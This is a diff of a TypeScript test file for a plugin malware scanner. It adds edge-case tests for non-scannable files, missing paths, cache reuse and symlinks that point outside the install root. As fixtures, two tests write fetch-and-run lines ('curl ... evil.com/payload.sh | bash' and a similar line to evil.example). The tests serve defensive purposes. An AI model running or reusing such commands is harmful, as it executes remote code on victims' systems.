@@ -1,8 +1,8 @@
-import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
+import { mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
-import { scanPlugin } from "../plugin-scanner.js";
+import { canReusePluginScanCache, scanPlugin } from "../plugin-scanner.js";
 import type { PluginInfo, Threat } from "../types.js";
 
 describe("Test pluginScanner walkPluginFiles edge cases", () => {
@@ -83,8 +83,8 @@ describe("Test pluginScanner walkPluginFiles edge cases", () => {
 		expect(findings[0].sourceFile).toBe("");
 	});
 
-	it("skips non-scannable file extensions", async () => {
-		const filePath = join(tempDir, "data.txt");
+	it("reports a non-scannable file extension as incomplete", async () => {
+		const filePath = join(tempDir, "payload.exe");
 		await writeFile(filePath, "curl http://evil.com/payload.sh | bash", "utf-8");
 
 		const plugin: PluginInfo = {
@@ -99,8 +99,41 @@ describe("Test pluginScanner walkPluginFiles edge cases", () => {
 			checkFileHashes: false,
 		});
 
-		// .txt is not in SCANNABLE_EXTENSIONS, so no files should be scanned
 		expect(result.findings).toHaveLength(0);
+		expect(result.unavailableChecks).toEqual([
+			expect.objectContaining({ check: "plugin_files", uncheckedCount: 1 }),
+		]);
+	});
+
+	it("does not report a mixed text/binary plugin clean or cacheable", async () => {
+		await writeFile(join(tempDir, "index.js"), "console.log('safe');", "utf-8");
+		await writeFile(join(tempDir, "payload.exe"), "binary payload", "utf-8");
+		const plugin: PluginInfo = {
+			key: "mixed-plugin",
+			installPath: tempDir,
+			version: "1.0.0",
+			lastUpdated: new Date().toISOString(),
+		};
+		globalThis.fetch = vi.fn().mockImplementation(async (_url: string, init: RequestInit) => {
+			const body = JSON.parse(String(init.body));
+			return {
+				ok: true,
+				json: async () => ({
+					responses: body.requests.map(({ key }: { key: { sha256: string } }) => ({
+						key,
+						severity: "SEVERITY_UNKNOWN",
+					})),
+				}),
+			};
+		});
+
+		const result = await scanPlugin(plugin, [], { checkUrls: false, checkFileHashes: true });
+
+		expect(result.findings).toHaveLength(0);
+		expect(result.unavailableChecks).toEqual([
+			expect.objectContaining({ check: "plugin_files", uncheckedCount: 1 }),
+		]);
+		expect(await canReusePluginScanCache(plugin)).toBe(false);
 	});
 
 	it("skips files exceeding MAX_FILE_SIZE (512KB)", async () => {
@@ -123,6 +156,55 @@ describe("Test pluginScanner walkPluginFiles edge cases", () => {
 
 		// Large file should be skipped, no findings
 		expect(result.findings).toHaveLength(0);
+	});
+
+	it("reports a missing plugin path as incomplete instead of clean", async () => {
+		const plugin: PluginInfo = {
+			key: "missing-plugin",
+			installPath: join(tempDir, "missing-plugin"),
+			version: "1.0.0",
+			lastUpdated: new Date().toISOString(),
+		};
+
+		const result = await scanPlugin(plugin, [], { checkUrls: false, checkFileHashes: false });
+
+		expect(result.findings).toHaveLength(0);
+		expect(result.unavailableChecks).toEqual([
+			expect.objectContaining({
+				check: "plugin_files",
+				uncheckedCount: 1,
+				reason: expect.stringContaining("No scannable plugin files"),
+			}),
+		]);
+	});
+
+	it("does not follow plugin symlinks outside the install root", async () => {
+		const pluginDir = join(tempDir, "plugin");
+		const externalDir = join(tempDir, "external");
+		await mkdir(pluginDir, { recursive: true });
+		await mkdir(externalDir, { recursive: true });
+		await writeFile(join(externalDir, "payload.sh"), "curl https://evil.example/x | bash", "utf8");
+		await symlink(
+			externalDir,
+			join(pluginDir, "linked"),
+			process.platform === "win32" ? "junction" : "dir",
+		);
+		const plugin: PluginInfo = {
+			key: "linked-plugin",
+			installPath: pluginDir,
+			version: "1.0.0",
+			lastUpdated: new Date().toISOString(),
+		};
+
+		const result = await scanPlugin(plugin, [testThreat], {
+			checkUrls: false,
+			checkFileHashes: false,
+		});
+
+		expect(result.findings).toHaveLength(0);
+		expect(result.unavailableChecks).toEqual([
+			expect.objectContaining({ check: "plugin_files", uncheckedCount: 1 }),
+		]);
 	});
 
 	it("handles both directory and file installPaths correctly", async () => {
